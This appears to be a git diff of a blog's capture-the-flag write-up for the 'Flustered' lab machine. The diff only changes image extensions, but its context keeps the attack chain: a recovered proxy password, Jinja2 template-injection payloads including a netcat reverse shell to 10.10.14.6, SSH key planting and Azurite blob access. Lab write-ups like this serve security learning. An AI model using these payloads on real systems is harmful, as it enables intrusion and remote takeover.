@@ -5,10 +5,10 @@ date: 2025-11-05 10:00:00
 categories: writeups
 tags: [Linux, glusterFS, squid, squidProxy, user pivoting, internal enum, Azure Storage pentesting]
 lang: en
-image: /assets/images/flustered/box-flustered.png
+image: /assets/images/flustered/box-flustered.webp
 ---
 
-![]({{ "/assets/images/flustered/flustered-card.png" | relative_url }})
+![]({{ "/assets/images/flustered/flustered-card.webp" | relative_url }})
 
 # Concepts seen on the machine
 ```
@@ -93,23 +93,23 @@ Nmap done: 1 IP address (1 host up) scanned in 40.31 seconds
 
 We launch whatweb to see information about the technologies in use, we see a subdomain
 
-![]({{ "/assets/images/flustered/Pasted image 20251105181431.png" | relative_url }})
+![]({{ "/assets/images/flustered/Pasted image 20251105181431.webp" | relative_url }})
 
 There is absolutely nothing on the website. :(
 
 ## 111 - RPC
 
-![]({{ "/assets/images/flustered/Pasted image 20251105181841.png" | relative_url }})
+![]({{ "/assets/images/flustered/Pasted image 20251105181841.webp" | relative_url }})
 
 ## 3128 - SQUID
 
 We access via URL
 
-![]({{ "/assets/images/flustered/Pasted image 20251105182136.png" | relative_url }})
+![]({{ "/assets/images/flustered/Pasted image 20251105182136.webp" | relative_url }})
 
 We tried making a request using this proxy with curl, and looking at the headers, we saw that it requires authentication.
 
-![]({{ "/assets/images/flustered/Pasted image 20251105182632.png" | relative_url }})
+![]({{ "/assets/images/flustered/Pasted image 20251105182632.webp" | relative_url }})
 
 
 ```
@@ -126,25 +126,25 @@ We execute it by passing the credentials we have listed through the URL.
 
 We found that it is a file sharing system, basically an NFS, so we listed the volumes with gluster.
 
-![]({{ "/assets/images/flustered/Pasted image 20251105191227.png" | relative_url }})
+![]({{ "/assets/images/flustered/Pasted image 20251105191227.webp" | relative_url }})
 
 We see that there are two, we will try to mount them on our system to see what they contain.
 
-![]({{ "/assets/images/flustered/Pasted image 20251105191311.png" | relative_url }})
+![]({{ "/assets/images/flustered/Pasted image 20251105191311.webp" | relative_url }})
 
 You are not mounting the containers correctly because we are getting a resolution failed to flustered error.
 
-![]({{ "/assets/images/flustered/Pasted image 20251105191451.png" | relative_url }})
+![]({{ "/assets/images/flustered/Pasted image 20251105191451.webp" | relative_url }})
 
 We update /etc/hosts and try again.
 
-![]({{ "/assets/images/flustered/Pasted image 20251105191538.png" | relative_url }})
+![]({{ "/assets/images/flustered/Pasted image 20251105191538.webp" | relative_url }})
 
 We verify that we can mount vol2 and view files, listing the important ones.
 
 We found an .ibd file, which usually stores passwords. In this case, they would belong to a Squid proxy user.
 
-![]({{ "/assets/images/flustered/Pasted image 20251105192115.png" | relative_url }})
+![]({{ "/assets/images/flustered/Pasted image 20251105192115.webp" | relative_url }})
 
 ```
 lance.friedman:o>WJ5-jD<5^m3
@@ -152,7 +152,7 @@ lance.friedman:o>WJ5-jD<5^m3
 
 We set up a proxy in FoxyProxy so that we can use this proxy and these credentials.
 
-![]({{ "/assets/images/flustered/Pasted image 20251105195554.png" | relative_url }})
+![]({{ "/assets/images/flustered/Pasted image 20251105195554.webp" | relative_url }})
 
 
 Now, when passing through this proxy, we don't have to access the IP or anything else, because the requests go from the proxy, so we try using `127.0.0.1` and see that the page changes, which makes us think that there may be internal routes, so we fuzz for routes.
@@ -161,7 +161,7 @@ Now, when passing through this proxy, we don't have to access the IP or anything
 curl -x http://lance.friedman:o>WJ5-jD<5^m3@flustered.htb:3128 http://127.0.0.1
 ```
 
-![]({{ "/assets/images/flustered/Pasted image 20251105195516.png" | relative_url }})
+![]({{ "/assets/images/flustered/Pasted image 20251105195516.webp" | relative_url }})
 
 We fuzz routes, *IMPORTANT, as the password contains special characters such as <, it must be URL-encoded*
 
@@ -171,7 +171,7 @@ gobuster dir -u http://127.0.0.1 -w /usr/share/wordlists/seclists/Discovery/Web-
 
 We find a route `/app`, we fuzz inside it again filtering by file extensions, such as `.py and .php`, and we find three other routes, `/templates`, `/static` and `/config`, and an `app.py` that returns a 200.
 
-![]({{ "/assets/images/flustered/Pasted image 20251105201522.png" | relative_url }})
+![]({{ "/assets/images/flustered/Pasted image 20251105201522.webp" | relative_url }})
 
 Upon accessing, it downloads the code, which is as follows
 
@@ -213,7 +213,7 @@ Analysing the code, it receives data from a POST request from a `siteurl` parame
 curl -X POST -H "Content-Type: application/json" -d '{"siteurl": "{{ 7 * 7 }}"}' http://10.10.11.131/
 ```
 
-![]({{ "/assets/images/flustered/Pasted image 20251105202130.png" | relative_url }})
+![]({{ "/assets/images/flustered/Pasted image 20251105202130.webp" | relative_url }})
 
 
 We see that the attack is happening, we pass the request to burpsuite with `-x http://127.0.0.1:8080` and we will execute an RCE.
@@ -222,7 +222,7 @@ We see that the attack is happening, we pass the request to burpsuite with `-x h
 "siteurl"="{% raw %}{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}{% endraw %}"
 ```
 
-![]({{ "/assets/images/flustered/Pasted image 20251105202455.png" | relative_url }})
+![]({{ "/assets/images/flustered/Pasted image 20251105202455.webp" | relative_url }})
 
 
 We will send ourselves a reverse shell.
@@ -231,72 +231,72 @@ We will send ourselves a reverse shell.
 "siteurl"="{% raw %}{{ self.__init__.__globals__.__builtins__.__import__('os').popen('/usr/bin/nc 10.10.14.6 6666 -e /bin/bash').read() }}{% endraw %}"
 ```
 
-![]({{ "/assets/images/flustered/Pasted image 20251105202628.png" | relative_url }})
+![]({{ "/assets/images/flustered/Pasted image 20251105202628.webp" | relative_url }})
 
 # Privesc
 
 We list basic information about the machine and discover a user named `jeniffer`.
 
-![]({{ "/assets/images/flustered/Pasted image 20251105202733.png" | relative_url }})
+![]({{ "/assets/images/flustered/Pasted image 20251105202733.webp" | relative_url }})
 
 Volume 1 is owned by Jennifer.
 
-![]({{ "/assets/images/flustered/Pasted image 20251105203737.png" | relative_url }})
+![]({{ "/assets/images/flustered/Pasted image 20251105203737.webp" | relative_url }})
 
 We launched Linpeas to list relevant information.
 
-![]({{ "/assets/images/flustered/Pasted image 20251105204239.png" | relative_url }})
+![]({{ "/assets/images/flustered/Pasted image 20251105204239.webp" | relative_url }})
 
 We have seen the `glusterfs.pem` file before. When we tried to mount vol1, we were unable to do so due to the following error
 
-![]({{ "/assets/images/flustered/Pasted image 20251105203956.png" | relative_url }})
+![]({{ "/assets/images/flustered/Pasted image 20251105203956.webp" | relative_url }})
 
 
 We download the certificate, move it to the path where it is being called, `/etc/ssl`, and try to mount the volume, but we get an error again, asking for the .key.
 
-![]({{ "/assets/images/flustered/Pasted image 20251105204702.png" | relative_url }})
+![]({{ "/assets/images/flustered/Pasted image 20251105204702.webp" | relative_url }})
 
 As it will ask us for all of them, we download them all and put them in `/etc/ssl`, and now it lets us mount the volume. 
 
-![]({{ "/assets/images/flustered/Pasted image 20251105204915.png" | relative_url }})
+![]({{ "/assets/images/flustered/Pasted image 20251105204915.webp" | relative_url }})
 
 We see that it is jennifer's /home directory. If we can write, we will create some SSH keys and log in.
 
-![]({{ "/assets/images/flustered/Pasted image 20251105205148.png" | relative_url }})
+![]({{ "/assets/images/flustered/Pasted image 20251105205148.webp" | relative_url }})
 
-![]({{ "/assets/images/flustered/Pasted image 20251105205201.png" | relative_url }})
+![]({{ "/assets/images/flustered/Pasted image 20251105205201.webp" | relative_url }})
 
 And now we have access as jennifer with ssh.
 
-![]({{ "/assets/images/flustered/Pasted image 20251105205225.png" | relative_url }})
+![]({{ "/assets/images/flustered/Pasted image 20251105205225.webp" | relative_url }})
 
 We found a file in var backups called key, which we can read, as well as several backups.
 
-![]({{ "/assets/images/flustered/Pasted image 20251106084655.png" | relative_url }})
+![]({{ "/assets/images/flustered/Pasted image 20251106084655.webp" | relative_url }})
 
 Inside the machine, we list and see that there is a new interface, so we will list the hosts on it. It is a Docker network.
 
-![]({{ "/assets/images/flustered/Pasted image 20251106091510.png" | relative_url }})
+![]({{ "/assets/images/flustered/Pasted image 20251106091510.webp" | relative_url }})
 
 We will use the scripts we used to enumerate in DMZ01, edit it slightly to cover all hosts on the network, and launch it.
 
-![]({{ "/assets/images/flustered/Pasted image 20251106095226.png" | relative_url }})
+![]({{ "/assets/images/flustered/Pasted image 20251106095226.webp" | relative_url }})
 
 We find a host, set up a tunnel with Ligolo, and scan the ports.
 
-![]({{ "/assets/images/flustered/Pasted image 20251106100016.png" | relative_url }})
+![]({{ "/assets/images/flustered/Pasted image 20251106100016.webp" | relative_url }})
 
 We found port 10000 open, tried to access it, and got an error.
 
-![]({{ "/assets/images/flustered/Pasted image 20251106100125.png" | relative_url }})
+![]({{ "/assets/images/flustered/Pasted image 20251106100125.webp" | relative_url }})
 
 Searching for the error on Google, we see that it is related to Azure Storage.
 
-![]({{ "/assets/images/flustered/Pasted image 20251106100247.png" | relative_url }})
+![]({{ "/assets/images/flustered/Pasted image 20251106100247.webp" | relative_url }})
 
 In particular, looking at the headers, we see that it is an Azurite Blob.
 
-![]({{ "/assets/images/flustered/Pasted image 20251106100402.png" | relative_url }})
+![]({{ "/assets/images/flustered/Pasted image 20251106100402.webp" | relative_url }})
 
 
 We will download the `storage-explorer` tool with snap to list this Azure container. We will keep in mind the key we saw earlier for Jennifer in case we are asked for it. We found it with linpeas in `/var/backups`.
@@ -318,9 +318,9 @@ snap connect storage-explorer:password-manager-service :password-manager-service
 
 Inside, it is not enough to have the tunnel, so we will forward the port locally so that it can be accessed locally.
 
-![]({{ "/assets/images/flustered/Pasted image 20251106102209.png" | relative_url }})
+![]({{ "/assets/images/flustered/Pasted image 20251106102209.webp" | relative_url }})
 
-![]({{ "/assets/images/flustered/Pasted image 20251106102235.png" | relative_url }})
+![]({{ "/assets/images/flustered/Pasted image 20251106102235.webp" | relative_url }})
 
 When we try to access it, we get an error message.
 
@@ -337,13 +337,13 @@ We continue to receive the error, so, looking for a solution, we found that the 
 export AZURE_STORAGE_API_VERSION=2023-11-03
 ```
 
-![]({{ "/assets/images/flustered/Pasted image 20251106121643.png" | relative_url }})
+![]({{ "/assets/images/flustered/Pasted image 20251106121643.webp" | relative_url }})
 
 We take the root one and authenticate ourselves via SSH.
 
-![]({{ "/assets/images/flustered/Pasted image 20251106121838.png" | relative_url }})
+![]({{ "/assets/images/flustered/Pasted image 20251106121838.webp" | relative_url }})
 
-![]({{ "/assets/images/flustered/Pasted image 20251106121909.png" | relative_url }})
+![]({{ "/assets/images/flustered/Pasted image 20251106121909.webp" | relative_url }})
 
 
 
